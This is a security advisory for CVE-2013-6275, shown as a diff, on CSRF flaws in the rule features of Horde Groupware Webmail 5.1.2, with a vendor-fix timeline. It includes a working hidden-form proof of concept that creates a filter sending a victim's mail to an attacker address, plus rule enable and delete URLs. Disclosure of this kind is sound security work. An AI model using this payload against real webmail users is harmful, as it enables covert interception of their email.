@@ -1,0 +1,56 @@
+#############################
+Exploit Title : Multiple CSRF Horde Groupware Web mail Edition
+Author:Marcela Benetrix
+Date: 10/25/13
+version: 5.1.2
+software link:http://www.horde.org/apps/webmail
+
+#############################
+GroupWare Web mail Edition
+
+Horde Groupware Webmail Edition is a free, enterprise ready, browser based communication suite. Users can read, send and organize email messages and manage and share calendars, contacts, tasks, notes, files, and bookmarks with the standards compliant components from the Horde Project
+
+##########################
+CSRF Location
+
+Several functionalities from Rules section were found to miss the token so as to prevent CSRF
+
+
+##########################
+POC
+
+A <body>
+    <form action="...../horde/ingo/basic.php?page=rule" method="POST">
+      <input type="hidden" name="actionID" value="rule_save" />
+      <input type="hidden" name="conditionnumber" value="-1" />
+      <input type="hidden" name="name" value="TestingCSRF" />
+      <input type="hidden" name="combine" value="1" />
+      <input type="hidden" name="field[0]" value="From" />
+      <input type="hidden" name="match[0]" value="contains" />
+      <input type="hidden" name="value[0]"
+value="test@hotmail.com" />
+      <input type="hidden" name="field[1]" value="" />
+      <input type="hidden" name="action" value="4" />
+      <input type="hidden" name="actionvalue"
+value="attacker@hotmail.com" />
+      <input type="hidden" name="stop" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+These were found at:
+  * Creating a rule
+  * Updating
+  * Enabling
+    (http://www.test.com/horde/ingo/basic.php?page=filters&rulenumber=2&actionID=rule_enable)
+  * Deleting ( url-based https://www.test.com/horde/ingo/basic.php?page=filters&rulenumber=6&actionID=rule_delete)
+
+###########################
+CVE identifier
+
+CVE-2013-6275.
+##########################
+Vendor Notification
+10/25/2013 to: the developers. They replied immediately and fixed the problem launching a patch:  http://bugs.horde.org/ticket/12796
+10/28/2013: Disclosure
